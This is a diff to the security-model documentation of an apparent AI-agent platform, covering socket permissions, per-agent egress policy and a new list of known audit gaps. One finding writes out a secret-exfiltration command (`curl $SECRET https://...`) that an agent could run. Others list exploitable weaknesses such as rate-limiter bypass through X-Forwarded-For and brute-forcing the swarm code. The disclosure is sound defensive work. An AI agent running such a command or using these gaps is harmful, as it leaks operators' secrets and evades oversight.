@@ -140,9 +140,9 @@ All inter-process communication uses gRPC over Unix domain sockets. No TCP ports
 
 **Single socket direction:**
 
-- **Agent sockets** (`/tmp/hiro-agent-{session-id}.sock`): One per worker. The control plane connects as a client to dispatch `ExecuteTool` and `Shutdown` RPCs. Owned by the worker's UID. Under UID isolation, `umask(0002)` makes these group-readable (`0664`).
+- **Agent sockets** (`/tmp/hiro-{session-prefix}/a.sock`): One per worker. The control plane connects as a client to dispatch `ExecuteTool`, `Shutdown`, and `WatchJobs` (background job completion streaming) RPCs. The socket directory is `0700` owned by the worker's UID, and the socket file is explicitly `chmod 0600` after creation.
 
-There is no worker→control plane socket. All inference, instance management, and operator operations happen in-process in the control plane. Workers are pure tool-execution sandboxes with no ability to initiate calls back to the control plane.
+There is no worker→control plane socket. All inference, instance management, and operator operations happen in-process in the control plane. Workers are pure tool-execution sandboxes with no ability to initiate calls back to the control plane. The `WatchJobs` RPC is a server-side stream initiated by the control plane to receive background job completion notifications — it does not grant workers any ability to call into the control plane.
 
 gRPC uses `insecure.NewCredentials()` for transport — this is safe because Unix sockets are local-only.
 
@@ -154,7 +154,7 @@ gRPC uses `insecure.NewCredentials()` for transport — this is safe because Uni
 - Read and write files in the shared workspace (`/hiro/workspace/`, mode `2775`).
 - Read agent definitions (`agents/`).
 - Spawn ephemeral child agents (with equal or fewer capabilities).
-- Make outbound network requests (not restricted by default — see [`docs/network-isolation.md`](network-isolation.md) for the planned per-agent network policy design).
+- Make outbound network requests (agents without `network.egress` have unrestricted outbound access; agents with `network.egress` are confined to declared domains via per-agent network namespaces — see [`docs/network-isolation.md`](network-isolation.md)).
 
 ### What agents CANNOT do
 
@@ -174,7 +174,21 @@ gRPC uses `insecure.NewCredentials()` for transport — this is safe because Uni
 
 ### Limitations
 
-- **Network isolation is domain-level, not IP-level.** Per-agent network namespaces with DNS-driven nftables rules isolate agents. Agents can only reach domains declared in their `network.egress` policy (default: no network). However, if an allowed domain shares an IP with a blocked domain (CDN co-hosting), the agent can reach both. See [`docs/network-isolation.md`](network-isolation.md) for the full design. Requires `CAP_NET_ADMIN` on the container.
+- **Network isolation is domain-level, not IP-level.** Per-agent network namespaces with DNS-driven nftables rules isolate agents with `network.egress` configured. Agents without `network.egress` have unrestricted outbound access (default-allow for backward compatibility). For agents with egress policies, if an allowed domain shares an IP with a blocked domain (CDN co-hosting), the agent can reach both. Requires `CAP_NET_ADMIN` on the container. See [`docs/network-isolation.md`](network-isolation.md) for the full design.
 - **Shared workspace is collaborative.** Any agent can read or modify files in `/hiro/workspace/`. This is by design for multi-agent collaboration, but means agents must be trusted not to tamper with shared data maliciously.
 - **UID pool is finite.** With 64 UIDs, a maximum of 64 concurrent agents can be isolated. Exhaustion returns an error, not a degraded mode.
-- **No syscall filtering.** Agents are not confined by seccomp, AppArmor, or similar mechanisms beyond what Docker applies by default.
+
+### Known Issues
+
+The following are known security gaps identified during audit, tracked for future resolution:
+
+- **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Network isolation (`network.egress`) is the primary mitigation — agents that handle sensitive secrets should have restricted egress.
+- **Secrets sent for all tool calls.** Secret env vars are currently included in every `ExecuteTool` gRPC message, not just Bash calls. This widens the in-process exposure window. A future improvement should gate injection to Bash-only calls.
+- **Short secret redaction floor.** The output redactor only scrubs secrets with values of 8+ characters (`minSecretLen`). Shorter secrets (PINs, short tokens) may appear unredacted in tool output and conversation history.
+- **Default-allow network egress.** Agents without `network.egress` configured have unrestricted outbound access. A future default-deny posture (loopback only unless `network.egress` is declared) would strengthen the security model.
+- **Session cookie lacks `Secure` flag.** The `hiro_session` cookie is `HttpOnly` + `SameSite=Strict` but not `Secure`, because Hiro commonly runs on local machines over HTTP. Deployments exposed to a network should use a TLS-terminating reverse proxy.
+- **No security response headers.** The HTTP server does not set `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options` globally. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
+- **Share tokens do not expire.** File share tokens are valid for the lifetime of the session secret (rotated on password change). There is no per-token TTL.
+- **Share token key reuse.** The share token AES-GCM encryption key is the same as the session HMAC signing key. A future improvement should use HKDF derivation for a separate key.
+- **Rate limiter trusts `X-Forwarded-For` from private peers.** When behind a proxy that doesn't sanitize `X-Forwarded-For`, an attacker can inject arbitrary IPs to bypass the login rate limiter.
+- **Swarm code entropy.** The 8-character swarm code has ~40 bits of entropy. A determined attacker with relay access could brute-force it in ~12 days. Longer codes (12+ chars) would improve this.
